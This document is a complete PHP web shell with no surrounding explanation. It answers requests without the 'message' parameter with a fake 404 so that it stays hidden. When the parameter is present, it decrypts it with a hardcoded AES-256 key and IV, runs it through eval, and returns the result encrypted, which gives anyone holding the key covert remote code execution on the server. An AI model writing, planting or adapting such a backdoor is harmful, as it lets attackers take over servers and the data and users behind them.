<?php
if (!isset($_REQUEST['message'])) {
    header('HTTP/1.1 404 Not Found');
    exit;
}
$key = hex2bin('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef');
$iv = str_repeat("x", 16);
$result = @eval(openssl_decrypt(base64_decode($_REQUEST['message']), 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv));
if ($result !== null) {
    echo base64_encode(openssl_encrypt((string)$result, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv));
}
